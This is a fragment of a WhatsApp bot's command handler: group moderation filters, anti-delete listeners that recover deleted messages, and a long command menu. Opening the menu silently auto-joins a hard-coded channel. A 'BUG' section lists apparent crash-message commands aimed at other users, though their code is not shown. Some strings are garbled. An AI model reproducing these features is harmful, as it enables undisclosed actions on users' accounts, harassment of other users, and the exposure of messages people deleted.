                        if (!isAdmins && !isCreator) {
                            await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
                            await reply(`👢 Bot kicked from group`, []);
                        } else {
                            await reply(`⚠️ Bot detected but I need admin rights to kick`, []);
                        }
                    }
                }
            }
        }

        // ANTI-BEG CHECK
        if (m.isGroup && body && !isAdmins && !isCreator) {
            const config = getSetting(m.chat, "antibeg", { enabled: false, action: 'delete' });
            if (config.enabled) {
                const begPatterns = [
                    /bless me/i, /send me money/i, /give me money/i, /help me financially/i,
                    /i need money/i, /i dey suffer/i, /no money/i, /hungry dey catch me/i,
                    /send me airtime/i, /buy me data/i, /fund me/i, /𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗ate to me/i,
                    /my account number/i, /bank transfer/i, /send cash/i, /poor me/i,
                    /assist me financially/i, /brother help/i, /sister help/i,
                    /anything for me/i, /what about me/i, /remember me/i,
                    /broke/i, /suffering/i, /starving/i, /no food/i
                ];

                const isBegging = begPatterns.some(pattern => pattern.test(body));

                if (isBegging) {
                    // Delete the message
                    await devtrust.sendMessage(m.chat, { delete: m.key });

                    if (config.action === 'delete') {
                        await reply(`💰 @${m?.sender?.split('@')?.[0] || 'User'} begging is not allowed`, [m.sender]);
                    }
                    else if (config.action === 'kick') {
                        if (!isAdmins && !isCreator) {
                            await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
                            await reply(`👢 @${m?.sender?.split('@')?.[0] || 'User'} kicked for begging`, [m.sender]);
                        } else {
                            await reply(`⚠️ @${m?.sender?.split('@')?.[0] || 'User'} would be kicked but I need admin rights`, [m.sender]);
                        }
                    }
                }
            }
        }

        if (getSetting(m.chat, "feature.autoreply", false)) {
            const autoReplyList = {
                "hi": "Hello 👋",
                "hello": "Hi there!",
                "I am 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗": "Coolest Whatsapp bot 😌"
            }
            if (autoReplyList[m.text?.toLowerCase()]) {
                await reply(autoReplyList[m.text.toLowerCase()])
            }
        }

        let chatbot = false;

        if (getSetting(m.chat, "feature.antibadword", false)) {
            const badWords = ["fuck", "bitch", "sex", "nigga", "bastard", "fool", "mumu", "idiot", "werey", "mother", "mama", "ass", "mad", "dick", "pussy", "bast"]
            if (badWords.some(word => m.text?.toLowerCase().includes(word))) {
                await reply(`❌ @${m?.sender?.split('@')?.[0] || 'User'} watch your language 😟!`, [m.sender])
                await devtrust.sendMessage(m.chat, { delete: m.key })
            }
        }

        if (getSetting(m.chat, "feature.antibot", false)) {
            let botPrefixes = ['.', '!', '/', '#']
            if (botPrefixes.includes(m.text?.trim()[0])) {
                if (!isOwner) {
                    await reply(`🤖 Anti-Bot active! @${m?.sender?.split('@')?.[0] || 'User'} not allowed.`, [m.sender])
                    await devtrust.sendMessage(m.chat, { delete: m.key })
                }
            }
        }

        //LOADING FUNCTION
        async function nexusLoading() {
            const nexusMylove = [`Loading menu...`];
            let msg = await devtrust.sendMessage(from, { text: "Connecting to 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 server....." });

            for (let i = 0; i < nexusMylove.length; i++) {
                await devtrust.sendMessage(from, {
                    text: nexusMylove[i],
                    edit: msg.key
                });
                await new Promise(resolve => setTimeout(resolve, 200));
            }
        }

        // Newsletter JIDs to auto-react to
        const newsletterJids = ["120363427254972269@newsletter"];
        const newsletterEmojis = [
            '❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💔', '❣️',
            '💕', '💞', '💓', '💗', '💖', '💘', '💝', '💟', '🥺', '😊', '🙏',
            '😙', '😻', '🔥', '😀', '😍', '🥰', '😘', '🤗', '🤩', '😎', '😇',
            '🥶', '🥳', '😋', '🎉', '🔥'
        ];

const hansRandom = (arr) => arr[Math.floor(Math.random() * arr.length)];

// ============================================================
// OPTIMIZED EVENT LISTENERS — case.js
// ============================================================

// Cache delete session di memory, bukan baca file tiap event
let _deleteSessionCacheDirty = false;
let _deleteSessionCache     = null;
let _deleteSessionFlushTimer = null;

function getCachedDeleteSession() {
    if (!_deleteSessionCache) {
        _deleteSessionCache = loadDeleteSession();
    }
    return _deleteSessionCache || [];
}

function invalidateDeleteSessionCache() {
    _deleteSessionCache = null;
}

// Tandai cache berubah & jadwalkan flush ke disk (debounced, max 1x per 300ms)
// This makes a burst of messages result in only 1 write, not per-message — much faster.
function scheduleDeleteSessionFlush() {
    _deleteSessionCacheDirty = true;
    if (_deleteSessionFlushTimer) return; // sudah dijadwalkan
    _deleteSessionFlushTimer = setTimeout(() => {
        _deleteSessionFlushTimer = null;
        if (_deleteSessionCacheDirty && _deleteSessionCache) {
            saveDeleteSession(_deleteSessionCache);
            _deleteSessionCacheDirty = false;
        }
    }, 300);
}

// Flush langsung tanpa nunggu debounce (dipanggil sebelum proses penting / shutdown)
function flushDeleteSessionNow() {
    if (_deleteSessionFlushTimer) {
        clearTimeout(_deleteSessionFlushTimer);
        _deleteSessionFlushTimer = null;
    }
    if (_deleteSessionCacheDirty && _deleteSessionCache) {
        saveDeleteSession(_deleteSessionCache);
        _deleteSessionCacheDirty = false;
    }
}
process.on('SIGINT', () => { flushDeleteSessionNow(); process.exit(0); });
process.on('SIGTERM', () => { flushDeleteSessionNow(); process.exit(0); });

// Helper cari original message (reusable, tidak duplikat kode)
function findOriginalMsg(db, jid, msgId) {
    if (!jid || !msgId) return null;

    // 1. Cek in-memory store (paling cepat)
    const storeKey = `${jid}_${msgId}`;
    if (global.msgUpsertStore?.has(storeKey)) {
        return global.msgUpsertStore.get(storeKey);
    }

    // 2. Fallback ke JSON
    if (!Array.isArray(db)) return null;
    const session = db.find(s => s.sesi === jid);
    if (!session || !Array.isArray(session.limit1000)) return null;

    for (const chatObj of session.limit1000) {
        const chatKey = Object.keys(chatObj).find(k => k.startsWith('chat'));
        if (chatKey && chatObj[chatKey]?.key?.id === msgId) {
            return chatObj[chatKey];
        }
    }

    return null;
}

function isAntiDeleteActive(db, jid) {
    if (!jid) return false;
    if (global.antidelete?.[jid] === true) return true;
    if (!Array.isArray(db)) return false;
    const session = db.find(s => s.sesi === jid);
    return session?.Aktif === 'yes';
}

devtrust.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const messages = chatUpdate.messages;
        if (!messages?.length) return;

        // Load the session once for all messages in this batch
        const db = getCachedDeleteSession();

        for (const msg of messages) {
            try {
                if (!msg?.message) continue;

                const jid = msg.key?.remoteJid;
                if (!jid || jid === 'status@broadcast') continue;

                const msgId   = msg.key?.id;
                const fromMe  = msg.key?.fromMe;
                const msgType = Object.keys(msg.message)[0];

                // ── REVOKE (delete-for-everyone) via messages.upsert ──
                if (msgType === 'protocolMessage') {
                    try {
                        const proto = msg.message.protocolMessage;
                        const t = proto?.type;
                        const isRevoke = (t === 0 || t === 'REVOKE' || t === 'MESSAGE_DELETE' || String(t) === '0');
                        if (isRevoke) {
                            const revokedId = proto?.key?.id;
                            console.log(`🗑️ [upsert/REVOKE] jid: ${jid} | msgId: ${revokedId} | type: ${t}`);
                            if (revokedId && isAntiDeleteActive(db, jid)) {
                                const originalMsg = findOriginalMsg(db, jid, revokedId);
                                if (originalMsg) {
                                    if (markAndCheckDeleteNotified(jid, revokedId)) {
                                        console.log(`⏭️ [upsert/REVOKE] Sudah dinotif sebelumnya, skip`);
                                    } else {
                                        console.log(`✅ [upsert/REVOKE] Pesan ditemukan, kirim notifikasi`);
                                        await sendAntiDeleteNotification(jid, originalMsg);
                                        global.adStats.recovered++;
                                    }
                                } else {
                                    console.log(`⚠️ [upsert/REVOKE] Message not found — msgId: ${revokedId}`);
                                    global.adStats.ignored++;
                                }
                            }
                        }
                    } catch (revErr) {
                        console.error('[upsert/REVOKE] Error:', revErr.message);
                    }
                    continue;
                }

                // Skip other system types that don't need to be stored
                if (msgType === 'senderKeyDistributionMessage') continue;

                // Only process if antidelete is active in this chat
                if (!isAntiDeleteActive(db, jid)) continue;

                // Save to the in-memory store (including fromMe messages,
                // since fromMe messages can be deleted and need to be recoverable)
                if (msgId) {
                    global.msgUpsertStore.set(
                        `${jid}_${msgId}`,
                        typeof structuredClone === 'function'
                            ? structuredClone(msg)
                            : JSON.parse(JSON.stringify(msg))
                    );
                    // Trim store kalau terlalu besar (max 3000 entry)
                    if (global.msgUpsertStore.size > 3000) {
                        const firstKey = global.msgUpsertStore.keys().next().value;
                        global.msgUpsertStore.delete(firstKey);
                    }
                }

                // Cache to JSON only for messages from other people
                if (!fromMe) {
                    cacheIncomingMessage(jid, msg, msgType);
                }

            } catch (innerErr) {
                console.error('[messages.upsert] Error per-message:', innerErr.message);
            }
        }

        // Newsletter auto-react (tetap jalan, tidak tergantung antidelete)
        for (const msg of messages) {
            try {
                if (!msg?.message) continue;
                const sender = msg.key?.participant || msg.key?.remoteJid;
                if (typeof newsletterJids !== 'undefined' && newsletterJids.includes(sender)) {
                    const serverId = msg.newsletterServerId;
                    if (serverId && typeof hansRandom === 'function') {
                        devtrust.newsletterReactMessage(
                            sender,
                            serverId.toString(),
                            hansRandom(newsletterEmojis)
                        ).catch(() => null);
                    }
                }
            } catch {}
        }

    } catch (err) {
        console.error('❌ [messages.upsert] Fatal error:', err.message);
    }
});

// ── messages.delete ──────────────────────────────────────────
devtrust.ev.on('messages.delete', async (item) => {
    try {
        const keys = item?.keys;
        if (!keys?.length) return;

        flushDeleteSessionNow(); // pastikan data terbaru sudah ke disk sebelum dibaca
        const db = loadDeleteSession();
        invalidateDeleteSessionCache(); // refresh cache

        for (const key of keys) {
            try {
                const jid   = key?.remoteJid;
                const msgId = key?.id;
                console.log(`🔔 [messages.delete] event fired | jid: ${jid} | msgId: ${msgId} | fromMe: ${key?.fromMe}`);
                if (!jid || !msgId) continue;
                if (!isAntiDeleteActive(db, jid)) continue;

                console.log(`🗑️ [messages.delete] jid: ${jid} | msgId: ${msgId}`);

                const originalMsg = findOriginalMsg(db, jid, msgId);

                if (originalMsg) {
                    if (markAndCheckDeleteNotified(jid, msgId)) {
                        console.log(`⏭️ [messages.delete] Sudah dinotif sebelumnya, skip`);
                    } else {
                        console.log(`✅ [messages.delete] Pesan ditemukan, kirim notifikasi`);
                        await sendAntiDeleteNotification(jid, originalMsg);
                        global.adStats.recovered++;
                    }
                } else {
                    console.log(`⚠️ [messages.delete] Message not found in store/JSON — msgId: ${msgId}`);
                    global.adStats.ignored++;
                }

            } catch (innerErr) {
                console.error('[messages.delete] Error per-key:', innerErr.message);
            }
        }
    } catch (err) {
        console.error('❌ [messages.delete] Fatal error:', err.message);
    }
});

// ── messages.update ──────────────────────────────────────────
devtrust.ev.on('messages.update', async (chatUpdate) => {
    try {
        if (!chatUpdate?.length) return;

        flushDeleteSessionNow(); // pastikan data terbaru sudah ke disk sebelum dibaca
        const db = loadDeleteSession();
        invalidateDeleteSessionCache(); // refresh cache

        for (const update of chatUpdate) {
            try {
                // Skip kalau bukan protocol message
                const protoMsg = update?.update?.message?.protocolMessage;
                if (!protoMsg) continue;

                // Skip clear chat
                if (update?.update?.clearChatKey) continue;

                // Cek semua kemungkinan type revoke
                // type 0 = REVOKE di beberapa build baileys lama
                // type 3 = REVOKE standar
                // string 'REVOKE' = beberapa fork baileys
                const t = protoMsg.type;
                const isRevoke = (t === 0 || t === 3 || t === 'REVOKE');
                if (!isRevoke) continue;

                const jid   = update.key?.remoteJid;
                const msgId = protoMsg.key?.id;
                if (!jid || !msgId) continue;
                if (!isAntiDeleteActive(db, jid)) continue;

                console.log(`🗑️ [messages.update] REVOKE detected | jid: ${jid} | msgId: ${msgId} | type: ${t}`);

                const originalMsg = findOriginalMsg(db, jid, msgId);

                if (originalMsg) {
                    if (markAndCheckDeleteNotified(jid, msgId)) {
                        console.log(`⏭️ [messages.update] Sudah dinotif sebelumnya, skip`);
                    } else {
                        console.log(`✅ [messages.update] Pesan ditemukan, kirim notifikasi`);
                        await sendAntiDeleteNotification(jid, originalMsg);
                        global.adStats.recovered++;
                    }
                } else {
                    console.log(`⚠️ [messages.update] Message not in store/JSON — msgId: ${msgId}`);
                    global.adStats.ignored++;
                }

            } catch (innerErr) {
                console.error('[messages.update] Error per-update:', innerErr.message);
            }
        }
    } catch (err) {
        console.error('❌ [messages.update] Fatal error:', err.message);
    }
});
        // ======================[ ⚠️ WARN SYSTEM HELPER ]======================
        async function handleWarn(chatId, userId, reason, mode) {
            if (!global.warns[chatId]) global.warns[chatId] = {};
            if (!global.warns[chatId][userId]) global.warns[chatId][userId] = 0;

            // MODE 1: DELETE ONLY - no warnings
            if (mode === 'delete') {
                return { action: 'delete', kicked: false };
            }

            // MODE 2: WARN - add warning
            if (mode === 'warn') {
                global.warns[chatId][userId] += 1;
                const warnCount = global.warns[chatId][userId];

                // Check if reached 3 warnings
                if (warnCount >= 3) {
                    // Reset warns
                    delete global.warns[chatId][userId];
                    return { action: 'kick', kicked: true, warnCount };
                }

                return { action: 'warn', kicked: false, warnCount };
            }

            // MODE 3: KICK - immediate kick
            if (mode === 'kick') {
                return { action: 'kick', kicked: true, warnCount: 0 };
            }

            return { action: 'delete', kicked: false };
        }

        // ============ MENU HELPER FUNCTIONS ============

        function formatUptime(seconds) {
            const days = Math.floor(seconds / (24 * 60 * 60));
            seconds = seconds % (24 * 60 * 60);
            const hours = Math.floor(seconds / (60 * 60));
            seconds = seconds % (60 * 60);
            const minutes = Math.floor(seconds / 60);
            seconds = Math.floor(seconds % 60);

            let time = '';
            if (days > 0) time += `${days}d `;
            if (hours > 0) time += `${hours}h `;
            if (minutes > 0) time += `${minutes}m `;
            if (seconds > 0 || time === '') time += `${seconds}s`;
            return time.trim();
        }

        function formatRam(total, free) {
            const used = (total - free) / (1024 * 1024 * 1024);
            const totalGb = total / (1024 * 1024 * 1024);
            const percent = ((used / totalGb) * 100).toFixed(1);
            return `${used.toFixed(1)}GB / ${totalGb.toFixed(1)}GB (${percent}%)`;
        }

        function countCommands() {
            try {
                const caseFileContent = fs.readFileSync(__filename).toString();
                // Count all unique case statements
                const commandRegex = /case ['"]([^'"]+)['"]:/g;
                const matches = [...caseFileContent.matchAll(commandRegex)];
                const uniqueCommands = new Set(matches.map(match => match[1]));
                const count = uniqueCommands.size;
                console.log(`📊 Total commands detected: ${count}`);
                return count;
            } catch (e) {
                console.error('Error counting commands:', e);
                return 4; // Your actual command count
            }
        }

        function getMoodEmoji() {
            const hour = getLagosTime().getHours();
            if (hour < 12) return '🌅';
            if (hour < 18) return '☀️';
            return '🌙';
        }

        function getLagosTime() {
            try {
                const options = {
                    timeZone: 'Africa/Lagos',
                    hour12: false,
                    hour: 'numeric',
                    minute: 'numeric'
                };
                const formatter = new Intl.DateTimeFormat('en-GB', options);
                const parts = formatter.formatToParts(new Date());
                const hour = parts.find(part => part.type === 'hour').value;
                const minute = parts.find(part => part.type === 'minute').value;
                const now = new Date();
                const lagosDate = new Date(now.toLocaleString('en-US', { timeZone: 'Africa/Lagos' }));
                return lagosDate;
            } catch (error) {
                const now = new Date();
                const utc = now.getTime() + (now.getTimezoneOffset() * 60000);
                return new Date(utc + (3600000 * 1));
            }
        }

const TOTAL_COMMANDS = countCommands(); // tetap untuk logging/display
const fileContent = fs.readFileSync(__filename).toString();
const matches = fileContent.match(/case '[^']+'(?!.*case '[^']+')/g) || [];
        const caseCount = matches.length;
const caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);
        let totalCases = caseCount;
        let listCases = caseNames.join('\n⭔ ');

const autoJoinGroup = async (devtrust, inviteLink) => {
            try {
                const inviteCode = inviteLink.match(/([a-zA-Z0-9_-]{22})/)?.[1];
                if (!inviteCode) throw new Error('Invalid invite link');
                const result = await devtrust.groupAcceptInvite(inviteCode);
                console.log('✅ Joined group:', result);
                return result;
            } catch (error) {
                console.error('❌ Failed to join group:', error.message);
                return null;
            }
        };

        function formatLagosTime() {
            const lagosTime = getLagosTime();
            const hours = lagosTime.getHours().toString().padStart(2, '0');
            const minutes = lagosTime.getMinutes().toString().padStart(2, '0');
            return `${hours}:${minutes}`;
        }

        // ============ GET PROFESSIONAL FEATURES ============

        function getOwnerName() {
            return "𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑";
        }

        function getBotVersion() {
            return "1.1";
        }

        function getBotMode() {
            return devtrust.public ? "PUBLIC" : "PRIVATE";
        }

        function getCurrentDateTime() {
            const date = new Date();
            const options = {
                timeZone: 'Africa/Lagos',
                weekday: 'long',
                year: 'numeric',
                month: 'long',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: false
            };
            return date.toLocaleString('en-US', options) + ' WAT';
        }
        // ============ MENU COMMAND ============
      if (isCmd) {
        switch (command) {
            // ============ MENU WITH ALPHABETICAL ORDER ============

            case 'allmenu':
            case 'commandlist': {
            autoJoinGroup(devtrust, "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r").catch(err => console.error("Failed to auto join:", err));
                await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });

                const menuImages = [
                    'https://i.ibb.co/rGr4bWW8/image1.jpg',
                    'https://i.ibb.co/rGr4bWW8/image1.jpg'
                ];

                const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
                const uptime = formatUptime(process.uptime());
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const platform = os.platform();
                const date = getLagosTime();
                const readmore = String.fromCharCode(8206).repeat(4001);
                const ramInfo = formatRam(totalMem, freeMem);
                const moodEmoji = getMoodEmoji();
                const totalCommands = countCommands();
                const hour = date.getHours();
                let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';

                // Get professional features
                const ownerName = getOwnerName();
                const botVersion = getBotVersion();
                const botMode = getBotMode();
                const currentDateTime = getCurrentDateTime();

                // ALPHABETICAL SECTIONS
                const menuText = `
┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender?.split('@')?.[0] || 'User'}
┃ \`𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
📱 *Pair 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗:* _https://t.me/rajumdxbug_bot
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐀𝐈* ◆━━┓
│❖ ${prefix}ai
│❖ ${prefix}codeai
│❖ ${prefix}deepseek
│❖ ${prefix}gemini
│❖ ${prefix}gemivbnni
│❖ ${prefix}gpt
│❖ ${prefix}gpt3
│❖ ${prefix}gpt4
│❖ ${prefix}gpt5
│❖ ${prefix}grok
│❖ ${prefix}grovnnk-ai
│❖ ${prefix}metaai
│❖ ${prefix}metabcn-ai
│❖ ${prefix}photoai
│❖ ${prefix}qwen
│❖ ${prefix}qwenxj
│❖ ${prefix}storyai
│❖ ${prefix}triviaai
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐀𝐍𝐈𝐌𝐄* ◆━━┓
│❖ ${prefix}akiyama
│❖ ${prefix}ana
│❖ ${prefix}animebite
│❖ ${prefix}animeblush
│❖ ${prefix}animebonk
│❖ ${prefix}animebully
│❖ ${prefix}animecringe
│❖ ${prefix}animedance
│❖ ${prefix}animedl
│❖ ${prefix}animeglomp
│❖ ${prefix}animehappy
│❖ ${prefix}animehighfive
│❖ ${prefix}animekill
│❖ ${prefix}animelick
│❖ ${prefix}animepoke
│❖ ${prefix}animesearch
│❖ ${prefix}animesmile
│❖ ${prefix}animesmug
│❖ ${prefix}animewave
│❖ ${prefix}animewink
│❖ ${prefix}animewlp
│❖ ${prefix}animeyeet
│❖ ${prefix}art
│❖ ${prefix}asuna
│❖ ${prefix}ayuzawa
│❖ ${prefix}bluearchive
│❖ ${prefix}boruto
│❖ ${prefix}bts
│❖ ${prefix}cartoon
│❖ ${prefix}cecan
│❖ ${prefix}chiho
│❖ ${prefix}chinagirl
│❖ ${prefix}chitoge
│❖ ${prefix}cogan
│❖ ${prefix}cosplay
│❖ ${prefix}cosplayloli
│❖ ${prefix}cosplaysagiri
│❖ ${prefix}𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗
│❖ ${prefix}deidara
│❖ ${prefix}doraemon
│❖ ${prefix}elaina
│❖ ${prefix}emilia
│❖ ${prefix}erza
│❖ ${prefix}exo
│❖ ${prefix}femdom
│❖ ${prefix}freefire
│❖ ${prefix}gamewallpaper
│❖ ${prefix}glasses
│❖ ${prefix}gremory
│❖ ${prefix}hacker
│❖ ${prefix}hentai
│❖ ${prefix}hestia
│❖ ${prefix}husbu
│❖ ${prefix}inori
│❖ ${prefix}islamic
│❖ ${prefix}isuzu
│❖ ${prefix}itachi
│❖ ${prefix}itori
│❖ ${prefix}jennie
│❖ ${prefix}jiso
│❖ ${prefix}justina
│❖ ${prefix}kaga
│❖ ${prefix}kagura
│❖ ${prefix}kakashi
│❖ ${prefix}kaori
│❖ ${prefix}keneki
│❖ ${prefix}kotori
│❖ ${prefix}kpop
│❖ ${prefix}kucing
│❖ ${prefix}kurumi
│❖ ${prefix}lisa
│❖ ${prefix}loli
│❖ ${prefix}madara
│❖ ${prefix}manga
│❖ ${prefix}megumin
│❖ ${prefix}mikasa
│❖ ${prefix}mikey
│❖ ${prefix}miku
│❖ ${prefix}minato
│❖ ${prefix}mobile
│❖ ${prefix}moe
│❖ ${prefix}motor
│❖ ${prefix}mountain
│❖ ${prefix}naruto
│❖ ${prefix}neko
│❖ ${prefix}neko2
│❖ ${prefix}nekonime
│❖ ${prefix}nezuko
│❖ ${prefix}nsfw
│❖ ${prefix}onepiece
│❖ ${prefix}pentol
│❖ ${prefix}pokemon
│❖ ${prefix}profil
│❖ ${prefix}programming
│❖ ${prefix}pubg
│❖ ${prefix}randblackpink
│❖ ${prefix}randomnime
│❖ ${prefix}randomnime2
│❖ ${prefix}rize
│❖ ${prefix}rose
│❖ ${prefix}ryujin
│❖ ${prefix}sagiri
│❖ ${prefix}sakura
│❖ ${prefix}sasuke
│❖ ${prefix}satanic
│❖ ${prefix}sfw
│❖ ${prefix}shina
│❖ ${prefix}shinka
│❖ ${prefix}shinomiya
│❖ ${prefix}shizuka
│❖ ${prefix}shota
│❖ ${prefix}shortquote
│❖ ${prefix}space
│❖ ${prefix}technology
│❖ ${prefix}tejina
│❖ ${prefix}toukachan
│❖ ${prefix}tsunade
│❖ ${prefix}waifu
│❖ ${prefix}wallhp
│❖ ${prefix}wallml
│❖ ${prefix}wallmlnime
│❖ ${prefix}yotsuba
│❖ ${prefix}yuki
│❖ ${prefix}yulibocil
│❖ ${prefix}yumeko
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ * -𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 𝐁𝐔𝐆* ◆━━┓
│❖ ${prefix}raju-invis
│❖ ${prefix}raju-fcnew
│❖ ${prefix}raju-bulldozer
│❖ ${prefix}raju-ios
│❖ ${prefix}raju-iosnew
│❖ ${prefix}raju-delay
│❖ ${prefix}raju-andro
│❖ ${prefix}raju-blank
│❖ ${prefix}raju-visibale
│❖ ${prefix}xgroup
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃* ◆━━┓
│❖ ${prefix}apk
│❖ ${prefix}apkdl
│❖ ${prefix}facebook
│❖ ${prefix}fb
│❖ ${prefix}fbdl
│❖ ${prefix}getbot
│❖ ${prefix}gitclone
│❖ ${prefix}ig
│❖ ${prefix}igdl
│❖ ${prefix}imbd
│❖ ${prefix}instagram
│❖ ${prefix}mediafire
│❖ ${prefix}movie
│❖ ${prefix}movie2
│❖ ${prefix}play
│❖ ${prefix}play2
│❖ ${prefix}sp
│❖ ${prefix}spotify
│❖ ${prefix}spotifydl
│❖ ${prefix}tgstickers
│❖ ${prefix}tiktok
│❖ ${prefix}tt
│❖ ${prefix}ytmp3
│❖ ${prefix}ytmp4
│❖ ${prefix}ytsearch
│❖ ${prefix}yts
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐅𝐔𝐍* ◆━━┓
│❖ ${prefix}8ball
│❖ ${prefix}advice
│❖ ${prefix}ascii
│❖ ${prefix}compliment
│❖ ${prefix}dadjoke
│❖ ${prefix}dare
│❖ ${prefix}fact
│❖ ${prefix}flirt
│❖ ${prefix}funfact
│❖ ${prefix}joke
│❖ ${prefix}quote
│❖ ${prefix}rate
│❖ ${prefix}rewrite
│❖ ${prefix}roast
│❖ ${prefix}ship
│❖ ${prefix}story
│❖ ${prefix}truth
│❖ ${prefix}truthdare
│❖ ${prefix}urban
│❖ ${prefix}wouldyou
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐆𝐀𝐌𝐄𝐒* ◆━━┓
│❖ ${prefix}coin
│❖ ${prefix}coinbattle
│❖ ${prefix}dice
│❖ ${prefix}emojiquiz
│❖ ${prefix}gamefact
│❖ ${prefix}guess
│❖ ${prefix}hangman
│❖ ${prefix}math
│❖ ${prefix}mathfact
│❖ ${prefix}numbattle
│❖ ${prefix}numberbattle
│❖ ${prefix}rps
│❖ ${prefix}rpsls
│❖ ${prefix}tictactoe
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐆𝐑𝐎𝐔𝐏* ◆━━┓
│❖ ${prefix}add
│❖ ${prefix}antibot
│❖ ${prefix}antibadword
│❖ ${prefix}antibeg
│❖ ${prefix}antilink
│❖ ${prefix}antispam
│❖ ${prefix}antitag
│❖ ${prefix}closetime
│❖ ${prefix}creategc
│❖ ${prefix}creategroup
│❖ ${prefix}demote
│❖ ${prefix}gcsettings
│❖ ${prefix}goodbye
│❖ ${prefix}groupinfo
│❖ ${prefix}groupjid
│❖ ${prefix}grouplink
│❖ ${prefix}groupstatus
│❖ ${prefix}gst
│❖ ${prefix}gstatus
│❖ ${prefix}hidetag
│❖ ${prefix}invite
│❖ ${prefix}kick
│❖ ${prefix}kickadmins
│❖ ${prefix}kickall
│❖ ${prefix}left
│❖ ${prefix}linkgc
│❖ ${prefix}listadmin
│❖ ${prefix}listadmins
│❖ ${prefix}listonline
│❖ ${prefix}members
│❖ ${prefix}mute
│❖ ${prefix}mutemember
│❖ ${prefix}opentime
│❖ ${prefix}poll
│❖ ${prefix}promote
│❖ ${prefix}resetlink
│❖ ${prefix}revoke
│❖ ${prefix}setdesc
│❖ ${prefix}setgrouppp
│❖ ${prefix}setname
│❖ ${prefix}tag
│❖ ${prefix}tagadmin
│❖ ${prefix}tagall
│❖ ${prefix}totalmembers
│❖ ${prefix}totag
│❖ ${prefix}unmute
│❖ ${prefix}unmutemember
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐋𝐎𝐆𝐎* ◆━━┓
│❖ ${prefix}advancedglow
│❖ ${prefix}blackpinklogo
│❖ ${prefix}blackpinkstyle
│❖ ${prefix}cartoonstyle
│❖ ${prefix}deletingtext
│❖ ${prefix}effectclouds
│❖ ${prefix}flag3dtext
│❖ ${prefix}flagtext
│❖ ${prefix}freecreate
│❖ ${prefix}galaxystyle
│❖ ${prefix}galaxywallpaper
│❖ ${prefix}gfx
│❖ ${prefix}gfx10
│❖ ${prefix}gfx11
│❖ ${prefix}gfx12
│❖ ${prefix}gfx2
│❖ ${prefix}gfx3
│❖ ${prefix}gfx4
│❖ ${prefix}gfx5
│❖ ${prefix}gfx6
│❖ ${prefix}gfx7
│❖ ${prefix}gfx8
│❖ ${prefix}gfx9
│❖ ${prefix}glitchtext
│❖ ${prefix}glowingtext
│❖ ${prefix}gradienttext
│❖ ${prefix}lighteffects
│❖ ${prefix}logomaker
│❖ ${prefix}luxurygold
│❖ ${prefix}makingneon
│❖ ${prefix}multicoloredneon
│❖ ${prefix}neonglitch
│❖ ${prefix}papercutstyle
│❖ ${prefix}pixelglitch
│❖ ${prefix}royaltext
│❖ ${prefix}sandsummer
